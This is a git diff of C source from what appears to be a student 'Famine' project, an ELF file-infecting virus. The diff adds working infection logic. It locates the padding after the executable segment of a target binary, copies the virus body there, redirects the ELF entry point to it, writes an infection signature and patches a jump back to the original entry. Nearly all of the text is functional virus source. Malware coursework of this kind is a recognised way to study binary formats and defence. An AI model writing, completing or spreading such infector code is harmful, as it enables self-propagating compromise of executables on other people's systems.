@@ -6,51 +6,73 @@
 /*   By: nguiard <marvin@42.fr>                     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/10/31 10:47:01 by nguiard           #+#    #+#             */
-/*   Updated: 2024/10/31 16:24:59 by nguiard          ###   ########.fr       */
+/*   Updated: 2024/11/05 18:16:41 by nguiard          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "famine.h"
 
-static bool		parsing(byte *file, const struct stat file_stat, elf_data *data);
+static bool		parsing(byte *file, const struct stat file_stat, profiling *this, elf_data *data);
 static size_t	off_end_exec_segment(elf_data *data);
 
 //	Infects the file located at path
 //
 //	Returns true on a critical error that needs to stop the whole infection program
-bool	infect(const str path) {
-	int64_t		fd;
-	int64_t		ret;
+bool	infect(profiling *this, const str path) {
+	int64_t		fd = 0;
+	int64_t		ret = 0;
 	struct stat file_stat = {0};
 	byte		*file_origin = NULL;
 	elf_data	data;
 
 	(void)fd;
 	(void)ret;
+	(void)this;
 
 	open(fd, path, O_RDWR);
+	if (fd < 0) {
+		printf(FILE_LINE("open failed: %ld\n"), ret);
+		return false;
+	}
 
 	fstat(ret, fd, &file_stat);
-	if (ret)
+	if (ret) {
 		printf(FILE_LINE("fstat failed: %ld\n"), ret);
+	}
 
 	if (file_stat.st_size < (long int)sizeof(Elf64_Ehdr))
 		goto infect_end;
 
 	mmap(file_origin, NULL, file_stat.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
 	close(fd);
-	if (file_origin == MAP_FAILED)
+	if (file_origin == MAP_FAILED) {
 		printf(FILE_LINE("fstat failed: %p\n"), file_origin);
+		return true;
+	}
 
 	// Logic starts
-	if (parsing(file_origin, file_stat, &data) == false)
+	if (parsing(file_origin, file_stat, this, &data) == false) {
+		printf("%s is already infected or not compatible\n", path);
 		goto infect_end;
+	}
 	
-	printf("I can infect %s\n", path);
+	//	Copy the code
+	ft_memcpy(file_origin + data.infection_offset, this->start_rip, this->size);
+	
+	//	Change the entrypoint
+	data.elf->e_entry = data.infection_offset;
+	
+	//	Copy signature
+	ft_memcpy(file_origin + data.infection_offset + this->size + SIGNATURE_OFFSET, this->signature, SIGNATURE_LEN);
+	printf("Written %s at 0x%lx\n", file_origin + data.infection_offset + this->size + SIGNATURE_OFFSET,
+		data.infection_offset + this->size + SIGNATURE_OFFSET);
 
-	ft_memcpy(data.file + data.signature_offset, (const byte *)SIGNATURE, SIGNATURE_LEN);
+	int	new_jump = 0 - (data.infection_offset + this->size) + data.original_entry_point + 12;
 
-	printf("Tried to infect (%lx): %s\n", data.signature_offset, data.file + data.signature_offset);
+
+	write(ret, 1, &new_jump, 4);
+	ft_memcpy(file_origin + data.infection_offset + this->size - 16, (byte *)&new_jump, 4);
+	write(ret, 1, file_origin + data.infection_offset + this->size - 16, 4);
 
 	// Logic ends
 	infect_end:
@@ -64,7 +86,7 @@ bool	infect(const str path) {
 //
 //	Returns true if it's compatible
 //	Returns false if it's not
-static bool	parsing(byte *file, const struct stat file_stat, elf_data *data) {
+static bool	parsing(byte *file, const struct stat file_stat, profiling *this, elf_data *data) {
 	(void)file_stat;
 
 	if (((uint32_t *)file)[0] != 0x464c457f)
@@ -80,11 +102,14 @@ static bool	parsing(byte *file, const struct stat file_stat, elf_data *data) {
 	data->elf = (Elf64_Ehdr *)file;
 	data->sections = (Elf64_Shdr *)(file + data->elf->e_shoff);
 	data->segments = (Elf64_Phdr *)(file + data->elf->e_phoff);
-	data->signature_offset = off_end_exec_segment(data);
-	data->infection_offset = data->signature_offset + SIGNATURE_LEN;
+	data->infection_offset = off_end_exec_segment(data);
+	data->signature_offset = data->infection_offset + this->size + SIGNATURE_OFFSET;
+	data->original_entry_point = data->elf->e_entry;
 
-	if (ft_memcmp((const byte *)SIGNATURE, file + data->signature_offset, SIGNATURE_LEN) == true)
+	if (ft_memcmp(this->signature, file + data->signature_offset, SIGNATURE_LEN) == true) {
+		printf("INFECTED !\n");
 		return false;
+	}
 
 	return true;
 }
@@ -113,12 +138,6 @@ static size_t	off_end_exec_segment(elf_data *data) {
 				if (segment_end % segment->p_align != 0)
 					segment_end += segment->p_align - (segment_end % segment->p_align);
 
-
-				//	printf("Range: %lx - %lx <=> %lx - %lx | type: %d | flags: %d == %d ?\n",
-				//		segment->p_offset, segment_end,
-				//		section->sh_offset, section->sh_offset + section->sh_size,
-				//		segment->p_type, segment->p_flags, (PF_X | PF_R));
-
 				if (segment->p_type == PT_LOAD &&
 					(segment->p_flags == (PF_X | PF_R)) &&
 					segment->p_offset <= section->sh_offset &&
@@ -136,7 +155,6 @@ static size_t	off_end_exec_segment(elf_data *data) {
 	for (size_t i = 0; i < data->elf->e_shnum; i++) {
 		section = &data->sections[i];
 
-		//	printf("Range: %lx - %lx\n", section->sh_offset, section->sh_offset + section->sh_size);
 		if (section->sh_offset >= exec_begin &&
 			section->sh_offset + section->sh_size < exec_end &&
 			section->sh_offset + section->sh_size > offset)
@@ -144,8 +162,6 @@ static size_t	off_end_exec_segment(elf_data *data) {
 			offset = section->sh_offset + section->sh_size;
 		}
 	}
-
-	printf("end of biggest shit: %08lx\n", offset);
 
 	return offset;
 }
